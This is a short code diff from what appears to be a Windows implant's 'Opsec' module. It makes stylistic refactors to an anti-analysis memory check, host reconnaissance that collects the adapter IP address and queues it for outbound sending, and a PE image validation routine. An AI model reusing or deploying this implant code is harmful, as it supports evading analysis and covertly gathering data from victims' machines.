@@ -84,9 +84,9 @@ namespace Opsec {
         stats.dwLength = sizeof(stats);
 
         Ctx->win32.GlobalMemoryStatusEx(&stats);
-        (stats.ullAvailPhys <= 4)
-            ? ntstatus = (ERROR_NOT_ENOUGH_MEMORY)
-            : ntstatus = (ERROR_SUCCESS);
+        stats.ullAvailPhys <= 4
+            ? ntstatus = ERROR_NOT_ENOUGH_MEMORY
+            : ntstatus = ERROR_SUCCESS;
     }
 
     VOID SeCheckEnvironment() {
@@ -96,7 +96,7 @@ namespace Opsec {
         IP_ADAPTER_INFO adapter     = { };
 
         char buffer[MAX_PATH]       = { };
-        DWORD length                = MAX_PATH;
+        unsigned long length        = MAX_PATH;
 
         if (!entry) {
             return_defer(ERROR_NO_DATA);
@@ -137,7 +137,7 @@ namespace Opsec {
         }
 
         x_memset(buffer, 0, length);
-        length = sizeof(adapter);
+        length = sizeof(IP_ADAPTER_INFO);
 
         if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
             Stream::PackString(entry, adapter.IpAddressList.IpAddress.String);
@@ -151,7 +151,7 @@ namespace Opsec {
         Dispatcher::OutboundQueue(entry);
     }
 
-    VOID SeImageCheck(_executable *source, _executable *target) {
+    VOID SeImageCheck(const _executable *const source, const _executable *const target) {
         HEXANE
 
         if (source->ntHead->Signature != IMAGE_NT_SIGNATURE) {
